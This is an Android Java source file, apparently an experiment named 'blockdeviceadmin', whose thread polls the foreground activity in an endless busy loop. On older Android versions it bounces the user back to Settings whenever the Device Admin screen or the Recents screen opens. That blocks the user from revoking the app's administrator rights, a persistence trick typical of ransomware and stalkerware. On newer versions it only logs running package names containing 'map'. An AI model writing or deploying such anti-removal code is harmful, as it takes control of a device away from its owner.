package com.test.www.blockdeviceadmin;

import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import com.jaredrummler.android.processes.*;
import com.jaredrummler.android.processes.ProcessManager;
import com.jaredrummler.android.processes.models.AndroidAppProcess;

import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Created by Dodobal-2 on 4/22/2016.
 */
class ListenActivity extends Thread{
    boolean exit = false;
    ActivityManager am = null;
    Context context = null;

    public ListenActivity(Context con){
        context = con;
        am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
    }

    public void run(){

        Looper.prepare();

        while(!exit){
            int currentapiVersion = android.os.Build.VERSION.SDK_INT;
            if (currentapiVersion<21) {
                // get the info from the currently running task
                List<ActivityManager.RunningTaskInfo> taskInfo = am.getRunningTasks(MAX_PRIORITY);
                String activityName = taskInfo.get(0).topActivity.getShortClassName();
                //Log.d("topActivity", "CURRENT Activity ::"+ activityName);
                if (taskInfo.get(0).topActivity.getShortClassName().equals(".DeviceAdminAdd")) {
                    context.startActivity(new Intent(Settings.ACTION_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
                } else if (taskInfo.get(0).topActivity.getShortClassName().equals(".recent.RecentsActivity")) {
                    context.startActivity(new Intent(Settings.ACTION_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK));
                }
            }else{
                List<AndroidAppProcess> processes = ProcessManager.getRunningAppProcesses();
                for (AndroidAppProcess process:processes) {

                    String pkgName = process.getPackageName();
                    if (pkgName.contains("map")){
                        Log.d("aaa","pkgname  " + pkgName);
                    }
                }
            }
        }
        Looper.loop();
    }
}
